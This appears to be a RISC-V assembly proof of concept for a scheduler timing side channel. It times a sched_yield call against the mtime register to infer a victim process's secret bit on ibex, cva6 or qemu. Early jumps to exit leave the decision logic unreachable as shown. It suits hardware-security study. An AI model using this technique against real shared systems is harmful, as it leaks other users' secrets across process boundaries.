# Assume a7 = 124 (sched_yield)
# Assume a7 = 64 (write)
# Assume a7 = 93 (exit)
# Assume a7 = 500 (custom_get_mtime_lower)
# Assume attacker starts first

li t1, 0x430000  # mtime address ibex
# li t1, 0x0200bff8 # mtime address cva6 & qemu

li t2, 1500               # Threshold: The "Expected Quantum" time
                          # You must calibrate this based on your OS interval.
# given interval = 10000, t2=20000 for qemu, t2=10000 for ibex, t2=1500 for cva6(this is approximate; probably needs more calibration)

attack_loop:
    # 1. Get Start Time
    # li a7, 500
    # ecall
    # mv s2, a0
    lw s2, 0(t1)
    

    # 2. Yield
    li a7, 124
    ecall
    j exit
    
    # 3. Get End Time
    # li a7, 500
    # ecall
    # mv s3, a0
    lw s3, 0(t1)

    # 4. Calculate Delta
    sub s4, s3, s2        # s4 = end - start (handles rollover automatically)
    mv a0, s4
    call print_int
    j exit

    # 5. Check against threshold
    # If delta < threshold, victim yielded early (Bit 0)
    # If delta >= threshold, victim worked (Bit 1)
    blt s4, t2, print_zero

# If we reached here, the delay was significant (Secret = 1)
print_one:
    li a0, 1
    la a1, msg_prefix
    li a2, 12
    li a7, 64
    ecall
    li a0, 1
    la a1, msg_one
    li a2, 1
    li a7, 64
    ecall
    j exit

print_zero:
    li a0, 1
    la a1, msg_prefix
    li a2, 12
    li a7, 64
    ecall
    li a0, 1
    la a1, msg_zero
    li a2, 1
    li a7, 64
    ecall
    j exit

.include "sample-programs/utils.s" # don't move to top!!; ensure msg_zero exists in your assembly

# exit
exit:
    li a0, 0
    li a7, 93
    ecall

.data
msg_one: .ascii "1"
msg_zero: .ascii "0"
msg_prefix: .ascii "secret val: "
newline: .string "\n"
